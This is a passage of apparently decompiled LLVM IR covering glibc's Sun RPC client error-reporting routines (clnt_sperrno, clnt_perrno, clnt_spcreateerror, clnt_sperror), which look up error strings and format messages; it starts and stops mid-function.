  %v4_8067b32 = mul i32 %v5_8067b2d, 65536
  %v5_8067b32 = or i32 %v4_8067b32, %v3_8067b32
  store i32 %v5_8067b32, i32* %eax.global-to-local, align 4
  %v1_8067b39 = trunc i32 %v3_8067b32 to i16
  %v2_8067b39 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8067b39 = add i32 %v2_8067b39, 2
  %v4_8067b39 = inttoptr i32 %v3_8067b39 to i16*
  store i16 %v1_8067b39, i16* %v4_8067b39, align 2
  %v0_8067b3d = load i32, i32* %eax.global-to-local, align 4
  %v3_8067b3d = udiv i32 %v0_8067b3d, 65536
  %v1_8067b41 = trunc i32 %v3_8067b3d to i16
  %v2_8067b41 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8067b41 = add i32 %v2_8067b41, 4
  %v4_8067b41 = inttoptr i32 %v3_8067b41 to i16*
  store i16 %v1_8067b41, i16* %v4_8067b41, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_8067b1e, { 1, 0 }
  uselistorder i32 %v2_8067b10, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8067aec, { 2, 1, 0 }
  uselistorder i32 %v4_8067ad8, { 3, 0, 2, 1 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 15, 14, 16, 18, 17, 20, 19, 22, 21, 24, 23, 26, 25, 28, 27, 30, 29, 32, 31, 33, 35, 34 }
  uselistorder i32 65536, { 3, 1, 4, 2, 5, 7, 6, 9, 8, 10, 11, 12, 13, 14, 15, 17, 16, 19, 18, 21, 20, 23, 22, 24, 25, 79, 81, 0, 26, 28, 27, 29, 30, 31, 32, 33, 36, 37, 35, 34, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 55, 54, 56, 58, 57, 59, 60, 61, 62, 64, 63, 65, 66, 67, 68, 69, 70, 71, 73, 72, 74, 78, 76, 75, 77, 80 }
  uselistorder i16 1, { 5, 6, 4, 0, 1, 2, 3 }
  uselistorder i16 11, { 1, 2, 0 }
  uselistorder i32 20, { 131, 132, 119, 120, 121, 63, 11, 122, 15, 135, 62, 145, 133, 146, 147, 125, 20, 126, 45, 46, 47, 48, 49, 50, 51, 52, 53, 134, 64, 65, 66, 67, 68, 69, 70, 9, 54, 71, 72, 73, 74, 75, 123, 124, 17, 136, 137, 78, 12, 26, 76, 128, 77, 148, 56, 55, 57, 58, 138, 139, 140, 141, 142, 21, 143, 144, 149, 127, 84, 129, 79, 80, 81, 82, 83, 130, 151, 150, 27, 28, 29, 30, 31, 32, 33, 37, 34, 35, 36, 0, 38, 39, 10, 85, 59, 60, 61, 86, 40, 41, 42, 43, 44, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 18, 22, 23, 13, 19, 24, 25, 14, 2, 97, 98, 99, 3, 100, 101, 102, 4, 103, 5, 104, 105, 106, 107, 1, 6, 108, 109, 110, 7, 111, 112, 113, 8, 114, 115, 116, 117, 118, 16 }
  uselistorder i16 0, { 45, 0, 10, 46, 19, 1, 11, 3, 47, 15, 48, 8, 12, 9, 13, 2, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 16, 36, 37, 38, 39, 17, 40, 41, 42, 43, 44, 4, 5, 6, 7, 18 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8067ad8, { 1, 0 }
}

define i32 @__GI_clnt_sperrno(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  br label %dec_label_pc_8067b58

dec_label_pc_8067b58:                             ; preds = %entry, %dec_label_pc_8067b6e
  %v0_8067b6e9 = phi i32 [ 0, %entry ], [ %v1_8067b6e, %dec_label_pc_8067b6e ]
  %v1_8067b58 = mul i32 %v0_8067b6e9, 8
  %v2_8067b58 = add i32 %v1_8067b58, ptrtoint (i32* @global_var_806f3c0.803 to i32)
  %v3_8067b58 = inttoptr i32 %v2_8067b58 to i32*
  %v4_8067b58 = load i32, i32* %v3_8067b58, align 8
  %v16_8067b58 = icmp eq i32 %v4_8067b58, %arg1
  %v1_8067b5f = icmp eq i1 %v16_8067b58, false
  br i1 %v1_8067b5f, label %dec_label_pc_8067b6e, label %dec_label_pc_8067b61

dec_label_pc_8067b61:                             ; preds = %dec_label_pc_8067b58
  %v2_8067b61 = add i32 %v1_8067b58, ptrtoint (i32* @global_var_806f3c4.804 to i32)
  %v3_8067b61 = inttoptr i32 %v2_8067b61 to i32*
  %v4_8067b61 = load i32, i32* %v3_8067b61, align 4
  %v1_8067b68 = add i32 %v4_8067b61, ptrtoint ([13 x i8]* @global_var_806f460.805 to i32)
  ret i32 %v1_8067b68

dec_label_pc_8067b6e:                             ; preds = %dec_label_pc_8067b58
  %v1_8067b6e = add i32 %v0_8067b6e9, 1
  %tmp = icmp ult i32 %v1_8067b6e, 18
  br i1 %tmp, label %dec_label_pc_8067b58, label %dec_label_pc_8067b74

dec_label_pc_8067b74:                             ; preds = %dec_label_pc_8067b6e
  ret i32 ptrtoint ([26 x i8]* @global_var_806f1bb.806 to i32)

; uselistorder directives
  uselistorder i32 %v0_8067b6e9, { 1, 0 }
  uselistorder label %dec_label_pc_8067b58, { 1, 0 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  %v1_8067b7d = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v1_8067b85 = add i32 %v1_8067b7d, 156
  %v2_8067b85 = inttoptr i32 %v1_8067b85 to i32*
  %v3_8067b85 = load i32, i32* %v2_8067b85, align 4
  %v1_8067b8b = call i32 @free(i32 %v3_8067b85)
  ret i32 %v1_8067b8b

; uselistorder directives
  uselistorder i32 (i32)* @free, { 63, 58, 65, 14, 13, 12, 11, 35, 34, 33, 32, 31, 30, 29, 28, 64, 61, 60, 59, 17, 57, 10, 66, 62, 16, 15, 9, 7, 6, 5, 4, 3, 2, 1, 8, 56, 55, 54, 53, 52, 51, 50, 49, 27, 26, 25, 24, 23, 38, 22, 21, 41, 36, 42, 20, 0, 40, 39, 19, 48, 47, 46, 45, 44, 43, 37, 18 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 19, 20, 21, 4, 5, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 35, 34, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 52, 48, 49, 50, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 65, 66, 67, 68, 69, 70, 71, 72, 62, 63, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 119, 117, 118, 115, 116, 109, 110, 111, 112, 113, 114, 122, 123, 120, 121, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134 }
}

define i32 @clnt_perrno(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8067b9c = load i32, i32* @global_var_80753f0, align 16
  store i32 %v0_8067b9c, i32* @ebx, align 4
  %v1_8067ba2 = call i32 @__GI_clnt_sperrno(i32 %arg1)
  %v0_8067ba8 = load i32, i32* @ebx, align 4
  %v2_8067baa = call i32 @__GI_fputs(i32 %v1_8067ba2, i32 %v0_8067ba8)
  ret i32 %v2_8067baa
}

define i32 @_buf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8067bb4 = load i32, i32* @ebx, align 4
  store i32 %v0_8067bb4, i32* %stack_var_-4, align 4
  %v1_8067bb8 = call i32 @__rpc_thread_variables(i32 %v0_8067bb4)
  %v1_8067bbd = add i32 %v1_8067bb8, 156
  %v2_8067bbd = inttoptr i32 %v1_8067bbd to i32*
  %v3_8067bbd = load i32, i32* %v2_8067bbd, align 4
  %v4_8067bbd = icmp eq i32 %v3_8067bbd, 0
  store i32 %v1_8067bb8, i32* @ebx, align 4
  %v1_8067bc6 = icmp eq i1 %v4_8067bbd, false
  br i1 %v1_8067bc6, label %dec_label_pc_8067bde, label %dec_label_pc_8067bc8

dec_label_pc_8067bc8:                             ; preds = %entry
  %v1_8067bd0 = call i32 @malloc(i32 256)
  %v1_8067bd8 = load i32, i32* @ebx, align 4
  %v2_8067bd8 = add i32 %v1_8067bd8, 156
  %v3_8067bd8 = inttoptr i32 %v2_8067bd8 to i32*
  store i32 %v1_8067bd0, i32* %v3_8067bd8, align 4
  %v0_8067bde.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8067bde

dec_label_pc_8067bde:                             ; preds = %entry, %dec_label_pc_8067bc8
  %v0_8067bde = phi i32 [ %v1_8067bb8, %entry ], [ %v0_8067bde.pre, %dec_label_pc_8067bc8 ]
  %v1_8067bde = add i32 %v0_8067bde, 156
  %v2_8067bde = inttoptr i32 %v1_8067bde to i32*
  %v3_8067bde = load i32, i32* %v2_8067bde, align 4
  %v2_8067be4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8067be4, i32* @ecx, align 4
  %v2_8067be6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8067be6, i32* @ebx, align 4
  ret i32 %v3_8067bde

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 40, 43, 4, 3, 2, 13, 12, 45, 44, 7, 42, 41, 39, 6, 5, 38, 0, 1, 46, 14, 11, 10, 15, 33, 25, 37, 36, 35, 34, 32, 31, 17, 30, 29, 28, 27, 26, 24, 23, 22, 21, 20, 19, 18, 16, 9, 8 }
  uselistorder i32 256, { 76, 7, 8, 9, 10, 67, 11, 12, 13, 14, 15, 16, 17, 18, 66, 19, 20, 21, 82, 77, 22, 23, 24, 25, 0, 1, 26, 2, 68, 27, 28, 83, 29, 30, 6, 3, 4, 71, 72, 5, 31, 32, 33, 34, 35, 36, 37, 73, 74, 38, 39, 40, 69, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 70, 84, 75, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 78, 65, 79, 85, 80, 86, 81, 63, 64 }
  uselistorder i32 156, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 (i32)* @__rpc_thread_variables, { 12, 17, 5, 16, 15, 14, 13, 11, 1, 3, 10, 2, 9, 0, 8, 4, 7, 6 }
  uselistorder label %dec_label_pc_8067bde, { 1, 0 }
}

define i32 @clnt_spcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-1040 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8067be8 = load i32, i32* @ebp, align 4
  %v0_8067be9 = load i32, i32* @edi, align 4
  %v0_8067bea = load i32, i32* @esi, align 4
  %v0_8067beb = load i32, i32* @ebx, align 4
  store i32 %v0_8067beb, i32* %stack_var_-16, align 4
  %v3_8067bf2 = call i32 @_buf(i32 %v0_8067beb, i32 %v0_8067bea, i32 %v0_8067be9)
  %v1_8067bf7 = icmp eq i32 %v3_8067bf2, 0
  store i32 %v3_8067bf2, i32* @ebp, align 4
  br i1 %v1_8067bf7, label %dec_label_pc_8067ccd, label %dec_label_pc_8067c01

dec_label_pc_8067c01:                             ; preds = %entry
  %v0_8067c01 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8067c01, i32* @edi, align 4
  %v3_8067c16 = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_806f1d5.807 to i32), i32 %arg1)
  %v0_8067c1b = load i32, i32* @edi, align 4
  %v1_8067c1b = inttoptr i32 %v0_8067c1b to i32*
  %v2_8067c1b = load i32, i32* %v1_8067c1b, align 4
  %v0_8067c1d = load i32, i32* @ebp, align 4
  %v2_8067c1d = add i32 %v0_8067c1d, %v3_8067c16
  store i32 %v2_8067c1d, i32* %ebx.global-to-local, align 4
  %v1_8067c21 = call i32 @__GI_clnt_sperrno(i32 %v2_8067c1b)
  store i32 %v1_8067c21, i32* @eax, align 4
  %v5_8067c2a = inttoptr i32 %v2_8067c1d to i8*
  %v5_8067c2b = call i32 @strcpy(i8* %v5_8067c2a, i32 %v1_8067c21)
  %v4_8067c30 = inttoptr i32 %v2_8067c1d to i8*
  %v3_8067c33 = call i32 @strlen(i8* %v4_8067c30)
  %v2_8067c3b = add i32 %v2_8067c1d, %v3_8067c33
  store i32 %v2_8067c3b, i32* %ebx.global-to-local, align 4
  %v0_8067c3d = load i32, i32* @edi, align 4
  %v1_8067c3d = inttoptr i32 %v0_8067c3d to i32*
  %v2_8067c3d = load i32, i32* %v1_8067c3d, align 4
  store i32 %v2_8067c3d, i32* @eax, align 4
  %v9_8067c3f = icmp eq i32 %v2_8067c3d, 12
  br i1 %v9_8067c3f, label %dec_label_pc_8067c82, label %dec_label_pc_8067c44

dec_label_pc_8067c44:                             ; preds = %dec_label_pc_8067c01
  %v9_8067c44 = icmp eq i32 %v2_8067c3d, 14
  %v1_8067c47 = icmp eq i1 %v9_8067c44, false
  br i1 %v1_8067c47, label %dec_label_pc_8067cc6, label %dec_label_pc_8067c49

dec_label_pc_8067c49:                             ; preds = %dec_label_pc_8067c44
  %v5_8067c50 = inttoptr i32 %v2_8067c3b to i8*
  %v5_8067c51 = call i32 @strcpy(i8* %v5_8067c50, i32 ptrtoint ([4 x i8]* @global_var_806f1da.808 to i32))
  %v0_8067c56 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8067c56 = inttoptr i32 %v0_8067c56 to i8*
  %v3_8067c59 = call i32 @strlen(i8* %v4_8067c56)
  %v0_8067c61 = load i32, i32* @edi, align 4
  %v1_8067c61 = add i32 %v0_8067c61, 4
  %v2_8067c61 = inttoptr i32 %v1_8067c61 to i32*
  %v3_8067c61 = load i32, i32* %v2_8067c61, align 4
  %v0_8067c64 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8067c64 = add i32 %v0_8067c64, %v3_8067c59
  store i32 %v3_8067c64, i32* %ebx.global-to-local, align 4
  %v1_8067c66 = call i32 @__GI_clnt_sperrno(i32 %v3_8067c61)
  store i32 %v1_8067c66, i32* @eax, align 4
  %v5_8067c6d = inttoptr i32 %v3_8067c64 to i8*
  %v5_8067c6e = call i32 @strcpy(i8* %v5_8067c6d, i32 %v1_8067c66)
  %v4_8067c73 = inttoptr i32 %v3_8067c64 to i8*
  %v3_8067c76 = call i32 @strlen(i8* %v4_8067c73)
  %v3_8067c7e = add i32 %v3_8067c64, %v3_8067c76
  store i32 %v3_8067c7e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8067cc6

dec_label_pc_8067c82:                             ; preds = %dec_label_pc_8067c01
  %v5_8067c89 = inttoptr i32 %v2_8067c3b to i8*
  %v5_8067c8a = call i32 @strcpy(i8* %v5_8067c89, i32 ptrtoint ([4 x i8]* @global_var_806f1da.808 to i32))
  %v0_8067c8f = load i32, i32* %ebx.global-to-local, align 4
  %v4_8067c8f = inttoptr i32 %v0_8067c8f to i8*
  %v3_8067c92 = call i32 @strlen(i8* %v4_8067c8f)
  %v2_8067c9f = add i32 %v0_8067c8f, %v3_8067c92
  store i32 %v2_8067c9f, i32* @esi, align 4
  %v2_8067ca2 = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v2_8067ca2, i32* @ebx, align 4
  %v0_8067ca7 = load i32, i32* @edi, align 4
  %v1_8067ca7 = add i32 %v0_8067ca7, 8
  %v2_8067ca7 = inttoptr i32 %v1_8067ca7 to i32*
  %v3_8067ca7 = load i32, i32* %v2_8067ca7, align 4
  %v5_8067caa = call i32 @__GI___glibc_strerror_r(i32 %v3_8067ca7, i32 %v2_8067ca2, i32 1024)
  %v3_8067cb0 = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v3_8067cb0, i32* @eax, align 4
  %v0_8067cb2 = load i32, i32* @esi, align 4
  %v5_8067cb2 = inttoptr i32 %v0_8067cb2 to i8*
  %v5_8067cb3 = call i32 @strcpy(i8* %v5_8067cb2, i32 %v2_8067ca2)
  %v0_8067cb8 = load i32, i32* @esi, align 4
  %v4_8067cb8 = inttoptr i32 %v0_8067cb8 to i8*
  %v3_8067cbb = call i32 @strlen(i8* %v4_8067cb8)
  %v0_8067cc3 = load i32, i32* @esi, align 4
  %v2_8067cc3 = add i32 %v0_8067cc3, %v3_8067cbb
  store i32 %v2_8067cc3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8067cc6

dec_label_pc_8067cc6:                             ; preds = %dec_label_pc_8067c44, %dec_label_pc_8067c49, %dec_label_pc_8067c82
  %v0_8067cc6 = phi i32 [ %v2_8067c3b, %dec_label_pc_8067c44 ], [ %v3_8067c7e, %dec_label_pc_8067c49 ], [ %v2_8067cc3, %dec_label_pc_8067c82 ]
  %v1_8067cc6 = inttoptr i32 %v0_8067cc6 to i8*
  store i8 10, i8* %v1_8067cc6, align 1
  %v0_8067cc9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067cc9 = add i32 %v0_8067cc9, 1
  %v2_8067cc9 = inttoptr i32 %v1_8067cc9 to i8*
  store i8 0, i8* %v2_8067cc9, align 1
  %v0_8067cd3.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8067ccd

dec_label_pc_8067ccd:                             ; preds = %entry, %dec_label_pc_8067cc6
  %v0_8067cd3 = phi i32 [ 0, %entry ], [ %v0_8067cd3.pre, %dec_label_pc_8067cc6 ]
  %v2_8067cd5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8067cd5, i32* @ebx, align 4
  store i32 %v0_8067bea, i32* @esi, align 4
  store i32 %v0_8067be9, i32* @edi, align 4
  store i32 %v0_8067be8, i32* @ebp, align 4
  ret i32 %v0_8067cd3

; uselistorder directives
  uselistorder i32 %v2_8067ca2, { 1, 0, 2 }
  uselistorder i32 %v3_8067c64, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8067c1d, { 1, 0, 2, 3 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8067ccd, { 1, 0 }
  uselistorder label %dec_label_pc_8067cc6, { 2, 1, 0 }
}

define i32 @clnt_pcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8067ce2 = load i32, i32* @global_var_80753f0, align 16
  store i32 %v0_8067ce2, i32* @ebx, align 4
  %v1_8067ce8 = call i32 @clnt_spcreateerror(i32 %arg1)
  store i32 %arg1, i32* @edx, align 4
  %v0_8067cef = load i32, i32* @ebx, align 4
  %v2_8067cf1 = call i32 @__GI_fputs(i32 %v1_8067ce8, i32 %v0_8067cef)
  ret i32 %v2_8067cf1
}

define i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1056 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8067cfb = load i32, i32* @ebp, align 4
  %v0_8067cfc = load i32, i32* @edi, align 4
  %v0_8067cfd = load i32, i32* @esi, align 4
  %v0_8067cfe = load i32, i32* @ebx, align 4
  store i32 %v0_8067cfe, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8067d0c = call i32 @_buf(i32 %v0_8067cfe, i32 %v0_8067cfd, i32 %v0_8067cfc)
  store i32 %v3_8067d0c, i32* @ebp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8067d15 = icmp eq i32 %v3_8067d0c, 0
  br i1 %v2_8067d15, label %dec_label_pc_8067e63, label %dec_label_pc_8067d1d

dec_label_pc_8067d1d:                             ; preds = %entry
  %v0_8067d1f = load i32, i32* @ebx, align 4
  %v1_8067d1f = add i32 %v0_8067d1f, 4
  %v2_8067d1f = inttoptr i32 %v1_8067d1f to i32*
  %v3_8067d1f = load i32, i32* %v2_8067d1f, align 4
  %v2_8067d22 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8067d22, i32* %eax.global-to-local, align 4
  %v7_8067d2b = add i32 %v3_8067d1f, 8
  %v8_8067d2b = inttoptr i32 %v7_8067d2b to i32*
  %v9_8067d2b = load i32, i32* %v8_8067d2b, align 4
  call void @__pseudo_call(i32 %v9_8067d2b)
  %v3_8067d3e = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_806f1d5.807 to i32), i32 %arg1)
  store i32 %v3_8067d3e, i32* %eax.global-to-local, align 4
  %v3_8067d4a = add i32 %v3_8067d3e, %v3_8067d0c
  store i32 %v3_8067d4a, i32* @ebx, align 4
  %v1_8067d4e = call i32 @__GI_clnt_sperrno(i32 %tmp18)
  store i32 %v1_8067d4e, i32* @eax, align 4
  %v0_8067d57 = load i32, i32* @ebx, align 4
  %v5_8067d57 = inttoptr i32 %v0_8067d57 to i8*
  %v5_8067d58 = call i32 @strcpy(i8* %v5_8067d57, i32 %v1_8067d4e)
  store i32 %v5_8067d58, i32* %eax.global-to-local, align 4
  %v0_8067d5d = load i32, i32* @ebx, align 4
  %v4_8067d5d = inttoptr i32 %v0_8067d5d to i8*
  %v3_8067d60 = call i32 @strlen(i8* %v4_8067d5d)
  %v0_8067d70 = load i32, i32* @ebx, align 4
  %v2_8067d70 = add i32 %v0_8067d70, %v3_8067d60
  store i32 %v2_8067d70, i32* @esi, align 4
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  switch i32 %tmp18, label %dec_label_pc_8067e3c [
    i32 0, label %dec_label_pc_8067e5a
    i32 1, label %dec_label_pc_8067e5a
    i32 2, label %dec_label_pc_8067e5a
    i32 3, label %dec_label_pc_8067d87
    i32 4, label %dec_label_pc_8067d87
    i32 5, label %dec_label_pc_8067e5a
    i32 6, label %dec_label_pc_8067e27
    i32 7, label %dec_label_pc_8067dbb
    i32 8, label %dec_label_pc_8067e5a
    i32 9, label %dec_label_pc_8067e27
    i32 10, label %dec_label_pc_8067e5a
    i32 11, label %dec_label_pc_8067e5a
    i32 12, label %dec_label_pc_8067e5a
    i32 13, label %dec_label_pc_8067e5a
    i32 14, label %dec_label_pc_8067e5a
    i32 15, label %dec_label_pc_8067e5a
    i32 16, label %dec_label_pc_8067e5a
    i32 17, label %dec_label_pc_8067e5a
  ]

dec_label_pc_8067d87:                             ; preds = %dec_label_pc_8067d1d, %dec_label_pc_8067d1d
  %v2_8067d8d = ptrtoint i32* %stack_var_-1056 to i32
  store i32 %v2_8067d8d, i32* @ebx, align 4
  %v3_8067d92 = load i32, i32* %stack_var_-28, align 4
  %v5_8067d99 = call i32 @__GI___glibc_strerror_r(i32 %v3_8067d92, i32 %v2_8067d8d, i32 1024)
  store i32 %v5_8067d99, i32* %eax.global-to-local, align 4
  %v0_8067e4f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8067e4f

dec_label_pc_8067dac:                             ; preds = %dec_label_pc_8067dc6
  %v2_8067dac = add i32 %v1_8067dc6, ptrtoint (i32* @global_var_806f2a4.811 to i32)
  %v3_8067dac = inttoptr i32 %v2_8067dac to i32*
  %v4_8067dac = load i32, i32* %v3_8067dac, align 4
  %v1_8067db3 = add i32 %v4_8067dac, ptrtoint ([18 x i8]* @global_var_806f2e0.812 to i32)
  br label %dec_label_pc_8067dd7

dec_label_pc_8067dbb:                             ; preds = %dec_label_pc_8067d1d
  %v3_8067dbb = load i32, i32* %stack_var_-28, align 4
  store i32 0, i32* @eax, align 4
  br label %dec_label_pc_8067dc6

dec_label_pc_8067dc6:                             ; preds = %dec_label_pc_8067dbb, %dec_label_pc_8067dcf
  %v0_8067dd739 = phi i32 [ 0, %dec_label_pc_8067dbb ], [ %v1_8067dcf, %dec_label_pc_8067dcf ]
  %v1_8067dc6 = mul nuw nsw i32 %v0_8067dd739, 8
  %v2_8067dc6 = add i32 %v1_8067dc6, ptrtoint (i32* @global_var_806f2a0.813 to i32)
  %v3_8067dc6 = inttoptr i32 %v2_8067dc6 to i32*
  %v4_8067dc6 = load i32, i32* %v3_8067dc6, align 8
  %v16_8067dc6 = icmp eq i32 %v4_8067dc6, %v3_8067dbb
  br i1 %v16_8067dc6, label %dec_label_pc_8067dac, label %dec_label_pc_8067dcf

dec_label_pc_8067dcf:                             ; preds = %dec_label_pc_8067dc6
  %v1_8067dcf = add nuw nsw i32 %v0_8067dd739, 1
  store i32 %v1_8067dcf, i32* @eax, align 4
  %tmp = icmp ult i32 %v1_8067dcf, 8
  br i1 %tmp, label %dec_label_pc_8067dc6, label %dec_label_pc_8067dd5

dec_label_pc_8067dd5:                             ; preds = %dec_label_pc_8067dcf
  br label %dec_label_pc_8067dd7

dec_label_pc_8067dd7:                             ; preds = %dec_label_pc_8067dac, %dec_label_pc_8067dd5
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8067dd5 ], [ %v1_8067db3, %dec_label_pc_8067dac ]
  store i32 %storemerge5, i32* @edi, align 4
  %v5_8067dde = inttoptr i32 %v2_8067d70 to i8*
  %v5_8067ddf = call i32 @strcpy(i8* %v5_8067dde, i32 ptrtoint ([9 x i8]* @global_var_806f213.814 to i32))
  store i32 %v5_8067ddf, i32* %eax.global-to-local, align 4
  %v0_8067de4 = load i32, i32* @esi, align 4
  %v4_8067de4 = inttoptr i32 %v0_8067de4 to i8*
  %v3_8067de7 = call i32 @strlen(i8* %v4_8067de4)
  store i32 %v3_8067de7, i32* @eax, align 4
  %v0_8067def = load i32, i32* @edi, align 4
  %v1_8067def = icmp eq i32 %v0_8067def, 0
  %v0_8067df1 = load i32, i32* @esi, align 4
  %v2_8067df1 = add i32 %v0_8067df1, %v3_8067de7
  store i32 %v2_8067df1, i32* @ebx, align 4
  br i1 %v1_8067def, label %dec_label_pc_8067e0f, label %dec_label_pc_8067df6

dec_label_pc_8067df6:                             ; preds = %dec_label_pc_8067dd7
  %v5_8067df9 = inttoptr i32 %v2_8067df1 to i8*
  %v5_8067dfa = call i32 @strcpy(i8* %v5_8067df9, i32 %v0_8067def)
  store i32 %v5_8067dfa, i32* %eax.global-to-local, align 4
  %v0_8067dff = load i32, i32* @ebx, align 4
  %v4_8067dff = inttoptr i32 %v0_8067dff to i8*
  %v3_8067e02 = call i32 @strlen(i8* %v4_8067dff)
  store i32 %v3_8067e02, i32* %eax.global-to-local, align 4
  %v0_8067e0a = load i32, i32* @ebx, align 4
  %v2_8067e0a = add i32 %v0_8067e0a, %v3_8067e02
  store i32 %v2_8067e0a, i32* @esi, align 4
  br label %dec_label_pc_8067e5a

dec_label_pc_8067e0f:                             ; preds = %dec_label_pc_8067dd7
  %v4_8067e1d = call i32 @sprintf(i32 %v2_8067df1, i32 ptrtoint ([36 x i8]* @global_var_806f21c.815 to i32))
  store i32 %v4_8067e1d, i32* %eax.global-to-local, align 4
  %v0_8067e22 = load i32, i32* @ebx, align 4
  %v2_8067e22 = add i32 %v0_8067e22, %v4_8067e1d
  br label %dec_label_pc_8067e57

dec_label_pc_8067e27:                             ; preds = %dec_label_pc_8067d1d, %dec_label_pc_8067d1d
  br label %dec_label_pc_8067e4f

dec_label_pc_8067e3c:                             ; preds = %dec_label_pc_8067d1d
  br label %dec_label_pc_8067e4f

dec_label_pc_8067e4f:                             ; preds = %dec_label_pc_8067e27, %dec_label_pc_8067d87, %dec_label_pc_8067e3c
  %v0_8067e4f = phi i32 [ %v2_8067d70, %dec_label_pc_8067e27 ], [ %v0_8067e4f.pre, %dec_label_pc_8067d87 ], [ %v2_8067d70, %dec_label_pc_8067e3c ]
  %v2_8067e50 = phi i8* [ getelementptr inbounds ([40 x i8], [40 x i8]* @global_var_806f1eb.816, i32 0, i32 0), %dec_label_pc_8067e27 ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806f1de.810, i32 0, i32 0), %dec_label_pc_8067d87 ], [ getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806f240.817, i32 0, i32 0), %dec_label_pc_8067e3c ]
  %v3_8067e50 = ptrtoint i8* %v2_8067e50 to i32
  %v4_8067e50 = call i32 @sprintf(i32 %v0_8067e4f, i32 %v3_8067e50)
  store i32 %v4_8067e50, i32* %eax.global-to-local, align 4
  %v0_8067e55 = load i32, i32* @esi, align 4
  %v3_8067e55 = add i32 %v0_8067e55, %v4_8067e50
  br label %dec_label_pc_8067e57

dec_label_pc_8067e57:                             ; preds = %dec_label_pc_8067e0f, %dec_label_pc_8067e4f
  %storemerge = phi i32 [ %v3_8067e55, %dec_label_pc_8067e4f ], [ %v2_8067e22, %dec_label_pc_8067e0f ]
  store i32 %storemerge, i32* @esi, align 4
  br label %dec_label_pc_8067e5a

dec_label_pc_8067e5a:                             ; preds = %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067d1d, %dec_label_pc_8067df6, %dec_label_pc_8067e57
